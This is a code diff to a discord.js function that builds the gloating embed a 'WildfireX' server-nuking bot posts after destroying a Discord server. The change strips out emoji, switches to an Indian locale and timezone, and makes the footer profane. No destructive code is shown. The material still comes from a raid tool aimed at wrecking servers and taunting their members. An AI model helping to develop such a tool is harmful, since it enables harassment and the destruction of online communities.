@@ -28,25 +28,23 @@ export function buildNukeEmbed(channelName) {
 export function buildVcNukeEmbed() {
   return new EmbedBuilder()
     .setColor(0xff0000)
-    .setTitle('☢️ WILDFIRE HAS LANDED')
-    .setDescription(
-      '> This server has been reduced to **ash** by **WildfireX**.\n' +
-      '> We are now occupying your comms. There is no escape.',
-    )
+    .setTitle('WILDFIRE HAS LANDED')
+    .setDescription('This server has been reduced to **ash** by **WildfireX**.')
     .addFields(
-      { name: '🔥 Status',    value: '`NUKED — TOTAL ANNIHILATION`', inline: false },
-      { name: '👑 Authority', value: 'WildfireX Security',           inline: true  },
-      { name: '📡 Position',  value: '`Wildfire Base — VC`',         inline: true  },
+      { name: 'Status',    value: '`NUKED — TOTAL ANNIHILATION`', inline: false },
+      { name: 'Authority', value: 'WildfireX Devastation',        inline: true  },
+      { name: 'Position',  value: '`Wildfire Base — VC`',         inline: true  },
       {
-        name: '🕒 Timestamp',
-        value: new Date().toLocaleString('en-GB', {
+        name: 'Timestamp',
+        value: new Date().toLocaleString('en-IN', {
           weekday: 'long', year: 'numeric', month: 'long',
           day: 'numeric', hour: '2-digit', minute: '2-digit',
+          timeZone: 'Asia/Kolkata',
         }),
         inline: false,
       },
     )
-    .setFooter({ text: 'WildfireX — This server is now ours.' })
+    .setFooter({ text: 'WildfireX — Your server is now fucked.' })
     .setTimestamp();
 }
 
